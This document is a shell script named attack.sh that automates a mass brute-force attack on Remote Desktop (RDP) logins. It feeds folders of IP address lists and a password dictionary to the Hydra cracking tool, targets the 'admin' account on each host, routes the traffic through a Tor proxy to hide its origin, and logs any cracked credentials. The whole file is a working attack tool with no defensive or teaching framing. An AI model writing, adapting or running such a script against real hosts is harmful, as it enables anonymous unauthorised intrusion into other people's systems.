#!/bin/sh

location=$1
password=$2
user=$(whoami)
files="/home/$user/$location/*"

if [ -z "$location" ]
then
	echo "ERROR: IP List File Location Missing! Usage: ./attack.sh FOLDER DICTIONARY"
elif [ -z "$password" ]
then
	echo "ERROR: Password Dictionary Missing! Usage: ./attack.sh FOLDER DICTIONARY"
else
	if [ -f "$password" ]
	then
		HYDRA_PROXY=socks5://l:p@127.0.0.1:9050
		export HYDRA_PROXY
		printenv | grep HYDRA
		sleep 5
		echo "Looking for IP list in $files\n"
		for f in $files
		do
			if [ -f "$f" ]
			then
				filename=${f##*/}
				echo "\n********\nLocated: $f! Using: $filename\n********\n"
				hydra -l admin -P "$password" -e nsr -o attack-output.out -t 1 -T 1 -W 1 -f -K -q -V -M $f rdp && mv "$f" /home/"$user"/data-tested/ && echo "\n********\n$filename moved to data-tested/\n********\n"
			else
				echo "ERROR: Problem with file or location: $f"
			fi
		done
	else
		echo "ERROR: Password Dictionary Issue: $password"
	fi
fi